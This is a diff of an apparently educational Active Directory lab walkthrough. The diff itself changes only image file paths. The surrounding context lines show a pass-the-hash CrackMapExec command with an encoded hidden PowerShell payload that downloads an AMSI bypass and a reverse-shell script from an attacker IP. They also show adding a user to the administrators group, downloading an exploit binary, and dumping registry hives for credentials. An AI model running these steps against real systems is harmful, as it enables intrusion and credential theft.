@@ -450,7 +450,7 @@ We retrieved the hash of the local `administrator` user and the cached hashes fo
 
 9\. The next step is to execute commands and get a shell. You might wonder why don't you just use psexec.py from Impacket, well because Defender will block it:
 
-![](<../../../.gitbook/assets/image (37) (1).png>)
+![](<../../../.gitbook/assets/image (37) (1) (2).png>)
 
 As said before, we can use the local administrator hash with CrackMapExec and execute commands with the `-x` flag.
 
@@ -776,7 +776,7 @@ crackmapexec smb 10.0.0.101 -u administrator -H a59cc2e81b2835c6b402634e584a8edc
 crackmapexec smb 10.0.0.101 -u administrator -H a59cc2e81b2835c6b402634e584a8edc --local-auth -x 'powershell.exe -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMgA0ADgALgAyADoAOAAwADkAMAAvAGEAbQBzAGkALgB0AHgAdAAiACkAKQA7ACAASQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMgA0ADgALgAyADoAOAAwADkAMAAvAEkAbgB2AG8AawBlAC0AUABvAHcAZQByAFMAaABlAGwAbABUAGMAcAAuAHAAcwAxACIAKQApADsA'
 ```
 
-![](<../../../.gitbook/assets/image (14) (1) (2).png>)
+![](<../../../.gitbook/assets/image (14) (1).png>)
 
 ### 11. Dumping DPAPI
 
@@ -834,7 +834,7 @@ net localgroup administrators sa_sql /add
 net localgroup "Remote Desktop Users" sa_sql /add
 ```
 
-![](<../../../.gitbook/assets/image (13) (1) (2).png>)
+![](<../../../.gitbook/assets/image (13) (1).png>)
 
 If we scan with Nmap now port 3389 is open:
 
@@ -901,7 +901,7 @@ $WebClient.DownloadFile("http://192.168.248.2:8090/BackupOperatorToDA.exe","C:\u
 
 4\. After a couple of minutes when we share the directory `~/adlab/share` we see that the files `SAM`, `SYSTEM` and `SECURITY` are there.
 
-![](<../../../.gitbook/assets/image (41).png>)
+![](<../../../.gitbook/assets/image (41) (2).png>)
 
 5\. The next step is to run [SecretDump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) from Impacket to retrieve the machine account NTLM hash out of these HIVE dumps:
 
@@ -955,7 +955,7 @@ We successfully cracked the password of the user `sa_admin`, the password is `We
 crackmapexec smb 10.0.0.2 10.0.0.3 -d bank.local -u sa_admin -p 'Welcome123456!'
 ```
 
-![](<../../../.gitbook/assets/image (15) (1).png>)
+![](<../../../.gitbook/assets/image (15) (1) (2).png>)
 
 We successfully owned all three the domains!
 
